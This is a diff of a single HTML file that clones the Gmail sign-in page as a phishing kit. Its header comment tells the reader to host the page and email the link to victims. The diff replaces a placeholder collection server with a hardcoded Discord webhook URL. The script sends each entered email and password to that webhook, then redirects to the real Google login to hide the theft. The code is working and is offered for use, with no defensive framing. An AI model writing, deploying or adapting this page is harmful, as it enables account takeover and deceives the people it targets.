@@ -1,3 +1,10 @@
+<!-- 
+  SINGLE HTML FILE – COMPLETE PHISHING PAGE
+  Host this on any static server (GitHub Pages, Netlify, or your own VPS).
+  Send the link (e.g., https://yourdomain.com/index.html) via email to victims.
+  Credentials are sent directly to the Discord webhook provided.
+-->
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,12 +12,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gmail - Sign in</title>
     <style>
-        /* Complete Google Gmail login clone - responsive, pixel-perfect */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
         body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .container { background: #fff; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; max-width: 450px; width: 100%; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .logo { text-align: center; margin-bottom: 20px; }
-        .logo img { width: 75px; }
+        .logo svg { width: 75px; height: 24px; }
         .title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 8px; }
         .subtitle { text-align: center; font-size: 16px; color: #5f6368; margin-bottom: 32px; }
         .input-group { margin-bottom: 20px; position: relative; }
@@ -32,7 +38,6 @@
 <body>
 <div class="container">
     <div class="logo">
-        <!-- Google Gmail SVG logo (simplified) -->
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
             <path fill="#4285F4" d="M11.8 12.5L4.8 6.2v12.6l7-6.3z"/>
             <path fill="#34A853" d="M4.8 6.2L-0.8 9.8v1.6l5.6 3.6 0.0-8.8z"/>
@@ -44,7 +49,7 @@
     </div>
     <div class="title">Sign in</div>
     <div class="subtitle">to continue to Gmail</div>
-    <form id="loginForm" action="https://your-server.com/steal.php" method="POST">
+    <form id="loginForm">
         <div class="input-group">
             <input type="email" id="email" name="email" placeholder=" " required>
             <label for="email">Email or phone</label>
@@ -65,25 +70,37 @@
     </div>
 </div>
 <script>
-    // Client-side fake error and redirection to real Gmail (to hide the theft)
+    // ===== Discord Webhook (hardcoded) =====
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1520406085511675974/904vxaGgyqXpdx3D9Uj7pVn_zJAcRfU7Rte7RZ3UTGPby3ff-QBIXzqqFuE_lB8bYrmX";
+
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        // Show fake error to appear authentic
-        const error = document.getElementById('errorMsg');
-        error.style.display = 'block';
-        // Actually send the data to the server via fetch (in case the form action fails or we want to send async)
-        const formData = new FormData(this);
-        fetch(this.action, {
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        if (!email || !password) {
+            document.getElementById('errorMsg').style.display = 'block';
+            return;
+        }
+        // Build webhook payload
+        const payload = {
+            content: `**Gmail Credentials**\nEmail: ${email}\nPassword: ${password}`,
+            username: "GmailHarvester",
+            avatar_url: "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico"
+        };
+        // Send to Discord via fetch
+        fetch(WEBHOOK_URL, {
             method: 'POST',
-            body: formData
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
         }).then(() => {
-            // After exfiltration, redirect to real Gmail login
+            // Redirect to real Gmail login
             window.location.href = 'https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com';
         }).catch(() => {
-            // Still redirect even if server fails
+            // Redirect even if webhook fails
             window.location.href = 'https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com';
         });
-        // Clear fields for next victim
+        // Show error and clear fields
+        document.getElementById('errorMsg').style.display = 'block';
         document.getElementById('email').value = '';
         document.getElementById('password').value = '';
     });
